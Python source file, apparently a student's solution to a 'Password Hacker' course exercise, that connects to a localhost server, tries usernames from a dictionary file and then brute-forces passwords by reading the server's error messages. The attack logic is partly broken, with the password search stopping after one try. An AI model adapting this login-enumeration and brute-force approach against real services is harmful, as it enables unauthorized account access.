import argparse
import itertools
import socket
import json
import string


class PasswordHacker:
    DICTIONARY = r"/home/feztix/documents/coding/python/basic_project/passwords.txt"
    _DICTIONARY = r"/home/feztix/documents/coding/python/Password_Hacker/Password Hacker (1)/task/hacking/logins.txt"

    def __init__(self):
        # For unpack using args.Ip/Port/Message
        args = self.init_cli()
        self.establish_connection(args)

    def init_cli(self):
        # Create the parser
        my_parser = argparse.ArgumentParser(description='Establishing a connection')

        # Add the arguments
        # my_parser.add_argument('Path', metavar='path', type=str,
        #                        help='the path to .py file')
        my_parser.add_argument("Ip", metavar='ip', choices=["localhost", "127.0.0.1"],
                               help="You need to choose only one IP address form the list.")
        my_parser.add_argument("Port", metavar="port", type=int,
                               help="You need to input port")
        # my_parser.add_awrgument("Message", metavar="message", type=str,
        #                        help="You need to input message for sending")

        # Execute the parse_args() method
        args = my_parser.parse_args()
        return args

    def establish_connection(self, args):
        with socket.socket() as client_socket:
            hostname = args.Ip
            port = args.Port
            address = (hostname, port)

            client_socket.connect(address)

            password_generator = self.password_generator()
            login_generator = self.login_generator()
            self.bruteforce(password_generator, login_generator, client_socket)

    # Send custom credentials
    def send_credentials(self, login, password, client_socket):
        # client_socket.send(password.encode())
        # response = client_socket.recv(1024)
        # response = response.decode()
        # if response == "Connection success!":
        #     print(password)
        #     return False

        data = json.dumps({"login": login, "password": password})
        client_socket.send(data.encode())
        response = client_socket.recv(1024)
        response = json.loads(response.decode()).get("result")
        return data, response

    # Call custom generator
    def bruteforce(self, gen_password, gen_login, client_socket):
        is_correct_login_find = False
        is_correct_letter_of_passwd_find = False
        is_correct_passwd_find = False

        correct_login = None
        correct_first_letter_of_passwd = None
        correct_password = None

        while True:
            # password = next(gen_password)

            # find correct login
            if is_correct_login_find == False:
                find_correct_login_return = self.find_correct_login(gen_login, client_socket)

                if find_correct_login_return != None:
                    correct_login = (json.loads(find_correct_login_return))['login']
                    print(correct_login)
                    is_correct_login_find = True

            # find first password letter
            if (is_correct_letter_of_passwd_find == False) and (is_correct_login_find == True):
                find_first_letter_return = self.find_first_letter_of_passwd(gen_password, correct_login, client_socket)
                # print(find_first_letter_return)

                if find_first_letter_return != None:
                    correct_first_letter_of_passwd = (json.loads(find_first_letter_return))['password']
                    print(correct_first_letter_of_passwd)
                    is_correct_letter_of_passwd_find = True

            # find correct password
            if (is_correct_passwd_find == False) and is_correct_letter_of_passwd_find and is_correct_login_find:
                find_correct_passwd_return = self.find_correct_password(gen_password, correct_login,
                                                                        correct_first_letter_of_passwd,
                                                                        client_socket)
                is_correct_passwd_find = True
                print(find_correct_passwd_return)
                # if find_correct_passwd_return != None:
                #     print(find_correct_passwd_return)
                #     is_correct_passwd_find = True

            if is_correct_passwd_find:
                break

    def find_correct_login(self, gen_login, client_socket):
        password = " "
        login = next(gen_login)
        # self.send_credentials(login, password, client_socket)

        data, resp = self.send_credentials(login, password, client_socket)
        # print(data[0])
        if resp != "Wrong login!":
            return data

    def find_first_letter_of_passwd(self, gen_passwd, correct_login, client_socket):
        # print(gen_passwd, "passwd")
        # print(correct_login, "passwd")
        password = next(gen_passwd)

        data, resp = self.send_credentials(correct_login, password, client_socket)
        # print(data, resp)
        if resp != "Wrong password!":
            return data

    def find_correct_password(self, gen_passwd, correct_login, first_letter, client_socket):
        # Create password
        # passwd = first_letter
        gen_passwd = self.password_generator(max_length=4)
        password = next(gen_passwd)

        data, resp = self.send_credentials(correct_login, password, client_socket)
        print(data, resp)
        if resp != "Wrong password!":
            return data

    # Custom generator
    def password_generator(self, max_length=2):
        letters = list(string.ascii_letters)
        digits = list(string.digits)
        # print(passwd)

        for i in range(1, max_length):
            complexity = itertools.chain(letters, digits)
            for passwd in itertools.product(complexity, repeat=i):
                yield "".join(passwd)

    def login_generator(self):
        with open(PasswordHacker._DICTIONARY, 'r') as file:
            for login_on_line in file:
                # if not login_on_line.isdigit():
                # for var in itertools.product(
                # *([letter.lower(), letter.upper()] for letter in login_on_line.strip("\n"))):
                # yield "".join(var)
                yield "".join(login_on_line.strip("\n"))

    def init(self):
        pass


if __name__ == "__main__":
    PasswordHacker().init()
